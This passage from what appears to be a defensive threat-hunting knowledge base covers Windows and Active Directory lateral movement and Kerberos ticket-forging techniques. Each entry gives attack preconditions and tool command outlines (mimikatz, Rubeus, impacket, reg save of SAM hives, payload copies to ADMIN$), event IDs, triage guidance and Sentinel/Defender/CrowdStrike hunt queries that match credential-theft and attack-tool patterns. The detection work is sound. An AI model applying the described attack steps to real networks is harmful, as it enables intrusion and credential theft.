benign.","hunt":[{"plat":"Sentinel","t":"One source chaining LogonType 10 across many hosts = black (RDP lateral) / single-host use = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4624 and LogonType == 10\n| summarize hosts=dcount(Computer), targets=make_set(Computer,20), accts=make_set(TargetUserName,10) by IpAddress\n| where hosts > 2"},{"plat":"MDE","t":"mstsc/xfreerdp/SharpRDP hitting 3389 on many hosts = black (PtH-over-RDP hub) / single RDP = white","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort == 3389\n| where InitiatingProcessFileName in~ (\"mstsc.exe\",\"xfreerdp.exe\",\"SharpRDP.exe\",\"rdp.exe\")\n| summarize targets=dcount(RemoteIP), dests=make_set(RemoteIP,20) by DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName\n| where targets > 2"}],"huntcs":[{"plat":"Event Search","t":"One host fanning out 3389 to many = chained RDP lateral = malicious","q":"event_simpleName=NetworkConnectIP4 RemotePort=3389\n| stats dc(RemoteAddressIP4) as targets by ComputerName, ContextBaseFileName\n| where targets > 3\n| sort - targets"},{"plat":"Event Search","t":"Many LogonType 10 admin RemoteInteractive = PtH-over-RDP = malicious","q":"event_simpleName=UserLogon LogonType=10\n| stats dc(RemoteAddressIP4) as sources count by ComputerName, UserName\n| where sources > 2\n| sort - count"}]},{"name":"WinRS / Remote Shell","aka":"winrs.exe / WS-Man remote shell","phase":"lateral","group":"Lateral Movement","mitre":"T1021.006","cve":"","sev":"Medium","summary":"Use the WinRM WinRS client to establish a remote command shell over a path separate from PowerShell Remoting and execute commands.","how":"Requires WinRM enabled (5985/5986) and admin/Remote Management Users rights. winrs -r:target -u:user -p:pass cmd runs commands directly. Being cmd.exe-based, it can evade some PSRemoting monitoring. Also used over the same path by NetExec or manually.","tools":"winrs.exe, WS-Management API, NetExec","detect":"WinRM/Operational log, winrs.exe execution, conhost/cmd.exe started via the WinRM service, 4624 LogonType3, internal connections to 5985/5986.","events":"4624(Type3), Microsoft-Windows-WinRM/Operational, Sysmon 1(winrs/wsmprovhost)","mitigate":"Disable WinRM on hosts that don't need it, restrict sources (TrustedHosts/IPSec), JEA. Correlate WinRM logs with process creation. Tier separation.","triage":"On the target confirm Microsoft-Windows-WinRM/Operational and Sysmon EID1 winrs.exe/wsmprovhost.exe with child conhost/cmd.exe, and correlate 4624 LogonType3 and anomalous internal connections to 5985/5986. Source-to-5985/5986 connection then cmd.exe run via wsmprovhost/winrs for the same account at the same time, with recon/download-style commands, is a true positive. An operator running known admin commands via winrs, or steady-state config-mgmt/monitoring access from a management server during business hours, leans benign.","hunt":[{"plat":"MDE","t":"winrs.exe run or cmd/conhost parented by wsmprovhost = black (WinRS remote shell) / legit WinRM = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where FileName =~ \"winrs.exe\"\n    or (InitiatingProcessFileName =~ \"wsmprovhost.exe\" and FileName in~ (\"cmd.exe\",\"conhost.exe\",\"powershell.exe\",\"pwsh.exe\"))\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| order by Timestamp desc"}],"huntcs":[{"plat":"LogScale","t":"winrs.exe or WinRM-spawned shell = remote shell = malicious","q":"#event_simpleName=ProcessRollup2\n| FileName=/winrs\\.exe/i OR (ParentBaseFileName=/wsmprovhost\\.exe/i AND FileName=/cmd\\.exe|conhost\\.exe|powershell\\.exe/i)\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count())"}]},{"name":"Lateral Movement via Remote Registry","aka":"reg /s / winreg RPC / Run key & service tampering","phase":"lateral","group":"Lateral Movement","mitre":"T1112, T1021.002, T1547.001","cve":"","sev":"Medium","summary":"Manipulate a remote registry via the Remote Registry service to indirectly execute code through service creation or Autorun entries.","how":"Requires admin rights and the Remote Registry service enabled (winreg RPC/445). Define a service and set ImagePath via `reg add \\\\target\\HKLM\\...\\Services\\...`, or register a payload under Run/RunOnce keys. Rewrite the remote registry with `impacket reg.py add`. Also used to steal LSA Secrets/credentials (`reg save HKLM\\SAM/SECURITY`), then chained into PtH etc.","tools":"reg.exe(\\\\target), impacket reg.py, PowerShell(remote registry), NetExec","detect":"Remote registry modifications (4657), additions to Run/RunOnce or Services keys, Remote Registry service start, `reg save` of SAM/SECURITY hives. Correlate with 4624 LogonType 3 and winreg named-pipe access.","events":"4657, 4624(Type3), 5145(winreg pipe), 7036(RemoteRegistry開始)","mitigate":"Disable the Remote Registry service on hosts that don't need it; enable auditing on key registry paths (4657). Restrict admin shares/RPC, deploy LAPS. Use EDR to detect service/Autorun changes made via remote registry.","triage":"On the target host confirm 4657 changes to Run/RunOnce or Services (ImagePath) and reg save of SAM/SECURITY hives, then correlate the preceding 5145 (RelativeTargetName=winreg pipe), 4624 LogonType3 and 7036 (RemoteRegistry on-demand start) for the same account and timeframe. If a user workstation drives new Services or LSA Secrets theft chaining into PtH, it is a true positive. Steady winreg access from known management servers (SCCM/asset inventory/monitoring/backup) touching legitimate keys is benign.","hunt":[{"plat":"Sentinel","t":"Remote (IP-present) modify of Run/Services keys (4657) = black (remote registry lateral) / local legit change = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4657\n| where ObjectName has_any (@\"\\CurrentVersion\\Run\", @\"\\CurrentVersion\\RunOnce\", @\"\\Services\\\")\n| where isnotempty(IpAddress) and IpAddress != \"-\" and IpAddress != \"::1\"\n| summarize n=count(), keys=make_set(ObjectName,20) by Computer, SubjectUserName, IpAddress, bin(TimeGenerated,10m)\n| where n > 0"},{"plat":"Sentinel","t":"Remote access to IPC$ winreg named pipe (5145) = black (RemoteRegistry ops) / none = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where RelativeTargetName has \"winreg\"\n| summarize n=count() by Computer, Account, IpAddress, bin(TimeGenerated,10m)\n| where n > 0"}],"huntcs":[{"plat":"LogScale","t":"winreg named-pipe connect = remote registry operation = malicious","q":"#event_simpleName=NamedPipeConnected\n| PipeName=/\\\\winreg$/i\n| groupBy([ComputerName, ContextBaseFileName], function=count())\n| sort(count, order=desc)"},{"plat":"Event Search","t":"reg save of SAM/SECURITY or Run/Services key rewrite = persistence/cred theft = malicious","q":"event_simpleName=ProcessRollup2 FileName=\"reg.exe\" (CommandLine=\"*save*SAM*\" OR CommandLine=\"*save*SECURITY*\" OR CommandLine=\"*\\\\Run*\" OR CommandLine=\"*\\\\Services*\")\n| stats count by ComputerName, UserName, ParentBaseFileName, CommandLine"}]},{"name":"Lateral Movement/Exec via WMI Event Subscription","aka":"Permanent WMI Event Subscription (__EventFilter/CommandLineEventConsumer)","phase":"lateral","group":"Lateral Movement","mitre":"T1546.003, T1047","cve":"","sev":"Medium","summary":"Register a permanent WMI event subscription remotely so a trigger condition executes a command (lateral movement + persistence).","how":"Requires admin rights and WMI reachability (135/DCOM). In the remote root\\subscription namespace, register an __EventFilter (trigger), a CommandLineEventConsumer/ActiveScriptEventConsumer (payload), and a __FilterToConsumerBinding. Commands run as SYSTEM on logon or at a fixed interval (__IntervalTimerInstruction). Registered remotely via `Set-WmiInstance -ComputerName` or impacket/Invoke-WMIEvent-style tools.","tools":"PowerShell(Set-WmiInstance -ComputerName), Invoke-WMIEvent, WMImplant, mofcomp/mof登録","detect":"Creation of __EventFilter/Consumer/Binding under root\\subscription in the WMI-Activity log (Sysmon 19/20/21 WmiEvent), anomalous command execution by WmiPrvSE child processes. Remote CIM/WMI instance creation.","events":"Sysmon 19/20/21, Microsoft-Windows-WMI-Activity/Operational, 4624(Type3)","mitigate":"Periodically inventory and baseline WMI subscriptions; monitor Sysmon WmiEvent. Restrict DCOM/WMI remote access. Use EDR to detect CommandLineEventConsumer registration.","triage":"On the target confirm Sysmon 19/20/21 creation of __EventFilter, CommandLineEventConsumer/ActiveScriptEventConsumer and __FilterToConsumerBinding under root\\subscription, then correlate Microsoft-Windows-WMI-Activity/Operational, 4624 Type3 and anomalous WmiPrvSE.exe child processes (cmd/powershell/encoded). A user-workstation source whose Consumer launches LOLBins or obfuscated script is a true positive. Known Filter/Consumer names registered by SCCM/SCOM/inventory tools during business hours from management servers are benign.","hunt":[{"plat":"MDE","t":"WmiPrvSE.exe spawning script/shell engines = malicious / legit WMI mgmt = benign","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where InitiatingProcessFileName =~ \"WmiPrvSE.exe\"\n| where FileName in~ (\"powershell.exe\",\"pwsh.exe\",\"cmd.exe\",\"wscript.exe\",\"cscript.exe\",\"mshta.exe\",\"rundll32.exe\",\"regsvr32.exe\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine\n| order by Timestamp desc"},{"plat":"MDE","t":"Command line creating permanent __EventFilter/Consumer/Binding = malicious subscription","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"__EventFilter\",\"CommandLineEventConsumer\",\"ActiveScriptEventConsumer\",\"__FilterToConsumerBinding\",\"root\\\\subscription\",\"root/subscription\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| order by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"Script/shell spawned directly under WmiPrvSE.exe = WMI-subscription exec (black) / normal WMI query only = white","q":"event_simpleName=ProcessRollup2 ParentBaseFileName=WmiPrvSE.exe (FileName=powershell.exe OR FileName=cmd.exe OR FileName=wscript.exe OR FileName=cscript.exe OR FileName=mshta.exe OR FileName=rundll32.exe)\n| stats count by ComputerName, UserName, FileName, CommandLine"},{"plat":"LogScale","t":"Execution parented by scrcons.exe (ActiveScript consumer) = permanent WMI consumer (black) / absent = white","q":"#event_simpleName=ProcessRollup2\n| ParentBaseFileName=/scrcons\\.exe/i\n| groupBy([ComputerName, UserName, FileName, CommandLine], function=count())"}]},{"name":"Lateral Movement via Named Pipe Impersonation","aka":"SMB named pipe relay / GetSystem / pipe impersonation","phase":"lateral","group":"Lateral Movement","mitre":"T1134.001, T1134.002","cve":"","sev":"Medium","summary":"Impersonate a client connecting to an SMB named pipe to obtain its credential context, used for lateral movement or privilege escalation.","how":"Requires the right to create a named pipe. The attacker creates a server-side pipe; when a victim/service connects to it, the ImpersonateNamedPipeClient API can impersonate the client's token. Representative techniques are Meterpreter getsystem (named-pipe method) and Potato variants (lure SYSTEM to a pipe via RPC/DCOM and escalate with SeImpersonate). The obtained token is used for network access to adjacent hosts.","tools":"Meterpreter getsystem, PrintSpoofer/RoguePotato/JuicyPotato, Cobalt Strike, カスタムパイプサーバ","detect":"Sysmon 17/18 (anomalous pipe names: `\\\\.\\pipe\\` random/known-abuse names), SYSTEM process spawned from a low-privilege process, sudden grant of 4624 LogonType 9/4672. Correlate pipe connections via RPC/DCOM with token elevation.","events":"Sysmon 17/18, 4624(Type9), 4672, 4696","mitigate":"Minimize SeImpersonate privilege, apply latest patches (shrinking Potato-style attack surface), and use EDR to detect pipe impersonation and abrupt SYSTEM escalation. Review service account privileges.","triage":"On the target confirm Sysmon 17/18 random or known-abuse pipe names under \\\\.\\pipe\\ (Potato-family, default msf names), then correlate a low-privilege process (IIS/service) immediately producing 4624 LogonType9, 4672 privilege assignment and 4696/4688 SYSTEM child processes. A SeImpersonate-holding process escalating to SYSTEM via RPC/DCOM in a short window from a suspicious source is a true positive. Known pipe names used by dev/debug or legitimate RPC services without token elevation are benign.","hunt":[{"plat":"MDE","t":"Known abuse pipe names (psexesvc/msagent_/status_) = malicious / OS pipes = benign","q":"DeviceEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"NamedPipeEvent\"\n| extend PipeName = tostring(parse_json(AdditionalFields).PipeName)\n| where PipeName has_any (\"\\\\psexesvc\",\"\\\\msagent_\",\"\\\\status_\",\"\\\\MSSE-\",\"\\\\postex_\",\"\\\\csexecsvc\",\"\\\\ntsvcs_\",\"\\\\winsvc\")\n| summarize Count=count(), Devices=make_set(DeviceName,20) by PipeName, InitiatingProcessFileName\n| order by Count desc"},{"plat":"Sentinel","t":"Sudden LogonType 9 (NewCredentials) token impersonation = malicious / habitual RunAs = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4624 and LogonType == 9\n| summarize Count=count(), Hosts=make_set(Computer,20) by TargetUserName, SubjectUserName, IpAddress\n| where Count > 0\n| order by Count desc"}],"huntcs":[{"plat":"LogScale","t":"Known abuse pipe names (psexesvc/postex_/MSSE- etc.) created = impersonation/lateral (black) / OS-standard pipes only = white","q":"#event_simpleName=NamedPipeCreate\n| PipeName=/\\\\(psexesvc|paexec|remcom|csexec|msagent_|status_|postex_|MSSE-|winreg_|\\d{4}\\.\\d{3})/i\n| groupBy([ComputerName, PipeName, ContextBaseFileName], function=count())"}]},{"name":"Lateral Movement via SSH (Windows OpenSSH / admin SSH)","aka":"OpenSSH Server on Windows / plink / SSH key reuse","phase":"lateral","group":"Lateral Movement","mitre":"T1021.004","cve":"","sev":"Medium","summary":"Move laterally by connecting to Windows OpenSSH or an admin SSH service using stolen credentials or keys.","how":"Requires OpenSSH Server (22) enabled on the target and valid credentials/private key. Authenticate via `ssh user@target`, plink, or a stolen ~/.ssh private key / tampered authorized_keys. With domain-integrated SSH, authenticate with AD credentials and execute commands directly. Chained lateral movement via key reuse and agent-forwarding abuse.","tools":"ssh/plink, 窃取秘密鍵, Metasploit ssh_login, NetExec ssh","detect":"Authentication events in OpenSSH/Operational logs, unexpected sshd startup on a host, 4624 LogonType 3 (SSH), changes to authorized_keys. Anomalous connections on internal port 22.","events":"4624(Type3), OpenSSH/Operational(sshd), 4688(sshd子プロセス)","mitigate":"Disable OpenSSH Server on hosts that don't need it; use key-based auth with a passphrase and source restrictions. Audit authorized_keys, rotate keys. Restrict SSH agent forwarding and enforce Tier separation.","triage":"On the target confirm OpenSSH/Operational sshd auth success with source IP, user and public-key fingerprint, then correlate 4624 LogonType3, 4688 sshd child processes (cmd/powershell) and Sysmon 11 authorized_keys modification. sshd on an unexpected host, reused stolen keys, or after-hours chained lateral movement is a true positive. Steady operation from a jump server, config management (Ansible) or admin PAW using known keys and IPs is benign.","hunt":[{"plat":"MDE","t":"sshd.exe spawning shells/recon commands = malicious lateral / pure sftp = benign","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where InitiatingProcessFileName =~ \"sshd.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"pwsh.exe\",\"whoami.exe\",\"net.exe\",\"net1.exe\",\"reg.exe\",\"wmic.exe\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine\n| order by Timestamp desc"},{"plat":"MDE","t":"authorized_keys created/modified = malicious key persistence / admin provisioning = verify","q":"DeviceFileEvents\n| where Timestamp > ago(1d)\n| where FileName =~ \"authorized_keys\"\n| where ActionType in (\"FileCreated\",\"FileModified\")\n| project Timestamp, DeviceName, FolderPath, ActionType, InitiatingProcessFileName, InitiatingProcessAccountName\n| order by Timestamp desc"}],"huntcs":[{"plat":"Event Search","t":"Shell/recon commands as sshd.exe children = SSH lateral movement (black) / normal interactive login = white","q":"event_simpleName=ProcessRollup2 ParentBaseFileName=sshd.exe (FileName=cmd.exe OR FileName=powershell.exe OR FileName=whoami.exe OR FileName=net.exe OR FileName=net1.exe)\n| stats count by ComputerName, UserName, FileName, CommandLine"},{"plat":"Event Search","t":"One host fanning out to many internal hosts on port 22 = SSH pivot (black) / steady link to one jump box = white","q":"event_simpleName=NetworkConnectIP4 RemotePort=22 ConnectionDirection=0\n| stats dc(RemoteAddressIP4) as targets by aid, ComputerName, ContextBaseFileName\n| where targets > 5"}]},{"name":"Payload Drop/Exec via Admin Shares","aka":"ADMIN$/C$ file copy + execution / net use","phase":"lateral","group":"Lateral Movement","mitre":"T1021.002, T1570","cve":"","sev":"High","summary":"A basic lateral movement technique: copy a file to ADMIN$ or C$ and launch it via a separate execution mechanism (task/service/WMI).","how":"Requires local admin and SMB (445). Stage with `net use \\\\target\\C$ /user:...` or `copy payload.exe \\\\target\\ADMIN$\\Temp\\`, then execute via schtasks/sc/WMI. It underpins many PtH tools and is deployed at scale via local-admin hash reuse (a ransomware-deployment staple).","tools":"net use/copy, impacket smbclient.py, NetExec --put-file/-x, robocopy","detect":"5140/5145 (write access to ADMIN$/C$ admin shares, executable in RelativeTargetName), 4624 LogonType 3, patterns of file distribution to many hosts in a short window. Correlate with service/task creation right after staging.","events":"5140, 5145, 4624(Type3), 7045/4698(後続実行)","mitigate":"Block workstation-to-workstation SMB (445) at the host firewall, audit admin-share access, enforce SMB signing. Use LAPS to prevent local-admin hash reuse, enforce Tier separation, and use EDR to correlate share writes with execution.","triage":"On the target confirm 5140/5145 write access to ADMIN$/C$ with an executable in RelativeTargetName (.exe/.dll/.bat), then correlate 4624 LogonType3 with immediately following 7045/4698 (service/task creation) for the same account and time. A single account pushing the same payload to many hosts in a short window is the ransomware-deployment pattern and a true positive. Origin from known management servers (SCCM distribution, software deployment, backup, scheduled robocopy) placing signed legitimate files is benign.","hunt":[{"plat":"Sentinel","t":"Executable writes to ADMIN$/C$ fanning out to many hosts = malicious staging / single copy = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where ShareName has_any (\"ADMIN$\",\"C$\")\n| where RelativeTargetName has_any (\".exe\",\".dll\",\".bat\",\".ps1\",\".scr\",\".vbs\")\n| summarize WrittenFiles=make_set(RelativeTargetName,20), TargetHosts=dcount(Computer) by Account, IpAddress, bin(TimeGenerated,1h)\n| where TargetHosts > 1 or array_length(WrittenFiles) > 2\n| order by TargetHosts desc"}],"huntcs":[{"plat":"Event Search","t":"One host fanning out to many hosts on 445 = admin-share distribution (black) / backup/file-server steady SMB = white","q":"event_simpleName=NetworkConnectIP4 RemotePort=445 ConnectionDirection=0\n| stats dc(RemoteAddressIP4) as hosts by aid, ComputerName, ContextBaseFileName\n| where hosts > 10"},{"plat":"LogScale","t":"Service pointing at ADMIN$/C$ or a random-name exe under Windows = post-drop exec (black) / legitimate MSI service = white","q":"#event_simpleName=CreateService\n| ServiceImagePath=/(ADMIN\\$|C\\$|\\\\\\\\127\\.0\\.0\\.1|\\\\Windows\\\\[A-Za-z0-9]{6,10}\\.exe)/i\n| groupBy([ComputerName, ServiceDisplayName, ServiceImagePath], function=count())"}]},{"name":"Golden Ticket","aka":"krbtgt forged TGT / Kerberos Golden Ticket","phase":"dominance","group":"Dominance & Persistence","mitre":"T1558.001","cve":"","sev":"Critical","summary":"The ultimate persistence technique: abuse the krbtgt account hash to forge a TGT with arbitrary user identity and privileges.","how":"Requires the krbtgt account's NTLM hash (or AES256 key), the domain SID, and the domain FQDN, obtained via DCSync or NTDS.dit theft. The TGT can be forged offline, embedding arbitrary RIDs (by default RID 500, Domain Admins/Enterprise Admins groups, and krbtgt's PAC). It can be created without contacting a DC and given an arbitrary lifetime (10 years by default), enabling long-term stealth.","tools":"mimikatz (kerberos::golden), Rubeus (golden), impacket ticketer.py, Cobalt Strike","detect":"Anomalies such as a TGS-REQ (4769) occurring without a preceding TGT request (AS-REQ), or a ticket lifetime longer than the default. Logons for nonexistent or disabled accounts, PAC integrity errors, and mimikatz's default 10-year ticket lifetime are indicators. Microsoft Defender for Identity's Golden Ticket detection alert is effective.","events":"4769, 4768, 4624 (異常なアカウント/寿命)","mitigate":"Reset the krbtgt password twice in succession (spacing the resets to account for the KDC key history) to invalidate existing forged tickets. Minimize DC access, enforce Tier 0 management, and audit privileges to prevent DCSync. Build regular krbtgt rotation into operations.","triage":"On the DC review 4769 and flag TGS-REQ appearing without a corresponding AS-REQ (4768), ticket lifetimes beyond default, nonexistent/disabled account names, and downgrade to Ticket Encryption Type 0x17 (RC4). MDI Golden Ticket detection, mimikatz default 10-year lifetime, and sudden RID 500/Domain Admins appearance together confirm a true positive. Clock skew or normal service-account 4769 (AES 0x12, business hours, matched to a 4768) is benign.","hunt":[{"plat":"Sentinel","t":"TGS-REQ (4769/RC4) to many SPNs with no preceding AS-REQ (4768) = forged TGT / normal post-TGT flow = benign","q":"let asreq = SecurityEvent | where TimeGenerated > ago(1d) | where EventID == 4768 | distinct TargetUserName;\nSecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where TargetUserName !endswith \"$\" and TargetUserName != \"\"\n| where TargetUserName !in~ (asreq)\n| where TicketEncryptionType == \"0x17\"\n| summarize ServiceCount=dcount(ServiceName), Services=make_set(ServiceName,15) by TargetUserName, IpAddress\n| where ServiceCount > 1\n| order by ServiceCount desc"}],"huntcs":[{"plat":"Event Search","t":"Ticket-forging tool with golden/krbtgt/ptt on the attacker host = Golden Ticket (black) / DC-legit Kerberos out of scope = white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*golden*\" OR CommandLine=\"*krbtgt*\" OR CommandLine=\"*kerberos::ptt*\" OR CommandLine=\"*Rubeus*\")\n| stats count by ComputerName, UserName, FileName, CommandLine"},{"plat":"Identity Protection","t":"krbtgt-forged TGT etype/lifetime anomaly is outside EDR telemetry — detect via Identity Protection","q":"// Falcon Identity Protection detection: Golden Ticket / forged TGT (anomalous encryption type & ticket lifetime, AS-REQ無しのTGS-REQ). DC-only Kerberos — Falconのプロセス/ネットワーク痕跡へピボットするか本検知に依存。"}]},{"name":"Silver Ticket","aka":"forged TGS / service ticket forgery","phase":"dominance","group":"Dominance & Persistence","mitre":"T1558.002","cve":"","sev":"High","summary":"Forge a TGS for a specific service using a service account's (including a computer account's) hash to gain access without going through the DC.","how":"Requires the NTLM/AES hash of the target service's service account (e.g., an account holding an SPN such as CIFS/HOST/MSSQLSvc, or a machine account). Because the TGS is forged directly, there is no communication with the KDC (DC) and little authentication logging on the DC. It works only per target service but is hard to detect, making it effective for localized persistence. It works on the many services where PAC validation is disabled.","tools":"mimikatz (kerberos::golden /service:cifs), Rubeus (silver), impacket ticketer.py","detect":"The strongest indicator is the gap where service access (4624) occurs without corresponding authentication logs (4768/4769) on the DC. Reconcile host-side logon events with DC Kerberos logs and monitor for anomalous PACs or SPN mismatches. Machine account password integrity validation also helps.","events":"4624 (ホスト側のみ、DCに4769なし)","mitigate":"Rotate service account passwords regularly; enable automatic machine account password rotation (30 days by default). Adopt gMSA/dMSA to make hash theft harder. Promote enforced KDC PAC validation (validated on the subject side).","triage":"The strongest indicator is host-side 4624 (successful service access) with no corresponding 4768/4769 on the DC, so reconcile host logon/service-access logs against DC Kerberos logs by account and timestamp. Localized access to CIFS/HOST/MSSQLSvc with SPN mismatch or PAC anomaly and no matching DC ticket is a true positive. Legitimate Kerberos always leaves a matching 4769 on the DC, so access tied to a DC-side 4769 is benign.","hunt":[{"plat":"Sentinel","t":"Network logon (4624/Type3) on hosts with no matching DC TGS (4769) = forged silver ticket / NTLM = possible benign","q":"let dcTGS = SecurityEvent | where TimeGenerated > ago(1d) | where EventID == 4769 | distinct TargetUserName;\nSecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4624 and LogonType == 3\n| where TargetUserName !endswith \"$\" and TargetUserName !in~ (\"ANONYMOUS LOGON\",\"\")\n| where TargetUserName !in~ (dcTGS)  // no service ticket ever seen at DC for this user\n| summarize AccessedHosts=make_set(Computer,20), cnt=count() by TargetUserName, IpAddress\n| order by cnt desc"}],"huntcs":[{"plat":"Event Search","t":"TGS-forging tool with /service: plus /rc4|/aes256 = Silver Ticket (black) / legit service auth leaving 4769 on DC = white","q":"event_simpleName=ProcessRollup2 CommandLine=\"*/service:*\" (CommandLine=\"*/rc4:*\" OR CommandLine=\"*/aes256:*\") (CommandLine=\"*/ptt*\" OR CommandLine=\"*kerberos::golden*\")\n| stats count by ComputerName, UserName, FileName, CommandLine"},{"plat":"Identity Protection","t":"Service access with no 4768/4769 on the DC is invisible to EDR alone — detect via Identity Protection correlation","q":"// Falcon Identity Protection detection: Silver Ticket / forged service TGS (host-side access without DC Kerberos log, SPN/PAC mismatch)."}]},{"name":"Diamond Ticket","aka":"PAC-tampered TGT","phase":"dominance","group":"Dominance & Persistence","mitre":"T1558","cve":"","sev":"Critical","summary":"A forged TGT with improved detection evasion: obtain a legitimate TGT, decrypt it, tamper with the PAC, and re-encrypt.","how":"Requires possession of the krbtgt key (AES recommended). First obtain a legitimate TGT via a real AS-REQ, decrypt it with the krbtgt key, tamper with the PAC's groups/RIDs, and re-encrypt. Unlike a Golden Ticket, it is based on a real request, so the ticket structure and flags match legitimate ones and detection indicators like lifetime anomalies don't appear. A legitimate AS-REQ (4768) remains on the DC, evading gap-based detection.","tools":"Rubeus (diamond), impacket (改変)","detect":"Since it's hard to distinguish from a legitimate TGT, the focus is preventing krbtgt key leakage itself. Use behavioral analytics to detect mismatches between PAC groups and actual directory state, rapid privilege escalation, and anomalous access patterns. Relies on Defender for Identity advanced detection.","events":"4768, 4769 (正規に見える)","mitigate":"Regular krbtgt rotation, Tier 0 protection, and AES key protection. Deploy behavior-based detection (UEBA). Cut off the root cause by blocking DCSync/NTDS theft.","triage":"Because a legitimate AS-REQ (4768) remains and the structure matches genuine tickets, single-log detection is hard; correlate PAC group/RID versus actual AD membership, unnatural privilege escalation right after TGT issuance, and short-window broad access by one account via behavior analytics. A PAC-versus-reality mismatch plus MDI advanced detection confirms a true positive. If PAC contents match directory reality with no escalation or anomalous access, it is benign.","hunt":[{"plat":"Sentinel","t":"Accounts whose TGT (4768) is RC4-only in an AES domain = suspected PAC/key manipulation / legacy RC4 clients = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768\n| where TargetUserName !endswith \"$\" and TargetUserName != \"\"\n| summarize RC4=countif(TicketEncryptionType==\"0x17\"), AES=countif(TicketEncryptionType in (\"0x11\",\"0x12\")), Hosts=make_set(IpAddress,10) by TargetUserName\n| where RC4 > 0 and AES == 0\n| order by RC4 desc"}],"huntcs":[{"plat":"Event Search","t":"Rubeus with diamond/tgtdeleg + ticketuser/krbkey = Diamond Ticket tampering (black) / absent = white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*diamond*\" OR CommandLine=\"*/krbkey:*\" OR (CommandLine=\"*/tgtdeleg*\" AND CommandLine=\"*/ticketuser:*\"))\n| stats count by ComputerName, UserName, FileName, CommandLine"},{"plat":"Identity Protection","t":"Diamond Ticket modifies a legit TGT and resists content-based detection — behavioral privilege-escalation correlation relies on Identity Protection","q":"// Falcon Identity Protection detection: Diamond Ticket (PAC group vs directory mismatch, anomalous rapid privilege gain). krbtgt鍵漏洩防止が根本策。"}]},{"name":"Sapphire Ticket","aka":"S4U2self+U2U PAC-acquisition forged TGT","phase":"dominance","group":"Dominance & Persistence","mitre":"T1558","cve":"","sev":"Critical","summary":"The stealthiest Golden-family variant: obtain a real privileged user's legitimate PAC via S4U2self/U2U and embed it in a forged ticket.","how":"Requires the krbtgt key. Abuse the S4U2self+U2U (User-to-User) mechanism to obtain a fully legitimate PAC of a real privileged account (e.g., a Domain Admin) from the KDC. Placing that PAC as-is into the forged TGT makes the PAC contents fully match directory reality, making it harder to detect than Diamond. All attributes/signatures are legitimate.","tools":"impacket ticketer.py (-impersonate, sapphire対応), Rubeus","detect":"Content-based detection is nearly impossible since the PAC is legitimate. Infer via anomalous U2U/S4U request patterns, traces of krbtgt key usage, and correlation with unexpected access tied to the victim privileged account. Fundamentally, preventing krbtgt leakage is the only effective measure.","events":"4769 (S4U/U2U要求), 4768","mitigate":"krbtgt rotation and Tier 0 protection. Monitor for S4U-related anomalies. Prioritize preventing key leakage by blocking DCSync.","triage":"Since S4U2self+U2U yields a fully legitimate PAC, content-based detection is nearly impossible, so extract anomalous U2U/S4U request patterns from DC 4769 (self-directed S4U2self, unnatural impersonation) and correlate unexpected source/time access tied to the victim privileged account with signs of krbtgt use. When these align, treat as a probable true positive. Expected U2U/S4U requests from a configured constrained-delegation service are benign.","hunt":[{"plat":"Sentinel","t":"U2U 4769 where ServiceName == TargetUserName with RC4 = Sapphire S4U2self+U2U trace / normal service TGS = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where ServiceName =~ TargetUserName  // U2U: TGS issued to self\n| where TicketEncryptionType == \"0x17\"\n| project TimeGenerated, Computer, TargetUserName, ServiceName, IpAddress, TicketOptions, TicketEncryptionType\n| order by TimeGenerated desc  // confirm ServiceName/U2U semantics in your tenant"}],"huntcs":[{"plat":"Event Search","t":"S4U tool with /u2u + /self + /impersonate = Sapphire Ticket forgery (black) / normal constrained delegation = white","q":"event_simpleName=ProcessRollup2 CommandLine=\"*/u2u*\" CommandLine=\"*/self*\" CommandLine=\"*/impersonate*\"\n| stats count by ComputerName, UserName, FileName, CommandLine"},{"plat":"Identity Protection","t":"S4U2self+U2U yields a genuine PAC so content detection fails — anomalous U2U/S4U request patterns detected via Identity Protection","q":"// Falcon Identity Protection detection: Sapphire Ticket (abnormal U2U/S4U request pattern tied to a high-priv victim). krbtgt漏洩防止が唯一の実効策。"}]},{"name":"Skeleton Key","aka":"Skeleton Key / LSASS-patching backdoor","phase":"dominance","group":"Dominance & Persistence","mitre":"T1556.001","cve":"","sev":"Critical","summary":"An in-memory backdoor that patches the DC's LSASS to allow authentication as any user with a master password.","how":"Requires Domain Admin-equivalent rights and SeDebugPrivilege on the DC. `mimikatz misc::skeleton` patches the LSASS process so that, in addition to the existing password, any account can authenticate with an arbitrary shared password (default `mimikatz`). It entails an RC4 downgrade and is cleared on reboot, so it's in-memory persistence. With multiple DCs, it must be applied to each DC.","tools":"mimikatz (misc::skeleton)","detect":"Monitor for suspicious code injection into LSASS / use of SeDebugPrivilege, regression of authentication encryption type to RC4 (downgrade), and traces of mimikatz execution on the DC. Detect events 4673/4611 and LSASS access (Sysmon EID 10). Defender for Identity's Skeleton Key detection alert is effective.","events":"4673(特権使用), 